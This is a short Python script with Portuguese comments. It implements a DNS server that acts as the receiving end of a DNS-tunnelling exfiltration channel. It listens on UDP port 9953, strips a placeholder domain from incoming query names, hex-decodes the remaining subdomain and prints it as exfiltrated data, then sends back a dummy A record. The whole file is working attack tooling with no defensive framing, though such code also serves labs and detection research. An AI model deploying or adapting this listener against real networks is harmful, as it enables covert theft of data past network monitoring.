###############################################################
# Imports
###############################################################
import socket
from dnslib import DNSRecord, QTYPE, RR, A
import time

###############################################################
# Vars. Global
###############################################################
_DNS_ADDR = ('0.0.0.0', 9953)
_FAKE_DOMAIN = '.example.com.'


###############################################################
# Classes e Funções
###############################################################
def start_dns_server():
    # Cria um socket para ouvir requisições DNS
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(_DNS_ADDR)
    print("Servidor DNS ouvindo na porta 9953...")
    
    while True:
        try:
            data, addr = sock.recvfrom(512)
            
            # Lê a requisição DNS
            request = DNSRecord.parse(data)
            data = str(request.q.qname)
            data = data.replace(_FAKE_DOMAIN, '')
            
            # Decodifica os dados do domínio
            data = ''.join([chr(int(data[i:i+2], 16)) for i in range(0, len(data), 2)])
            print(f"Dados exfiltrados: {data}")            
            
            # Criando um objeto DNSRecord para a resposta
            dns_response = DNSRecord()
            # Adicionando uma resposta DNS
            dns_response.add_answer(RR(_FAKE_DOMAIN[1:], QTYPE.A, rdata=A('127.0.0.1')))
            # Convertendo a resposta para uma representação de bytes
            response_bytes = dns_response.pack()
            print(response_bytes.hex())  # Exibindo a resposta em hexadecimal

            #time.sleep(8)
            # Envia a resposta DNS de volta para o cliente
            sock.sendto(response_bytes, addr)

        except Exception as e:
            print(e)


###############################################################
# Main
###############################################################
if __name__ == "__main__":
    start_dns_server()
